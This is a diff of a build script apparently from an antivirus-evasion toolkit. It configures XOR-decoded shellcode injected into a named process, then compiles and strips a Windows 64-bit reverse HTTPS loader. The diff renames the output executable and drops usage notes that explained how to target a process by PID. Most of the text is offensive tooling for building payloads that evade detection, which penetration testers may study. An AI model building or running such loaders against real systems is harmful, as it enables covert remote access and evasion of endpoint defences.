@@ -70,17 +70,13 @@ set_decoder xor
 set_payload_execution_method inject_shellcode_procname
 
 # compile 
-$win64_compiler -o output/injectshc_targetfromcmd_fopen_gethostbyname_xor_revhttps_win64.exe source/avet.c -lws2_32
-strip output/injectshc_targetfromcmd_fopen_gethostbyname_xor_revhttps_win64.exe
+$win64_compiler -o output/injectshc_xor_revhttps_win64.exe source/avet.c -lws2_32
+strip output/injectshc_xor_revhttps_win64.exe
 
 # cleanup
 cleanup_techniques
 
 
 echo "
-# Usage example of generated injectshc_targetfromcmd_fopen_gethostbyname_xor_revhttps_win64.exe:
-# $ injectshc_targetfromcmd_fopen_gethostbyname_xor_revhttps_win64.exe first second 480
-
-# The first and second command line parameters can be arbitrary strings, as they are not used. We just need the third command line parameter.
-# Use the third parameter to specify the PID of the process you want to inject your payload into.
-"
+# Usage example of generated injectshc_xor_revhttps_win64.exe:
+# $ injectshc_xor_revhttps_win64.exe
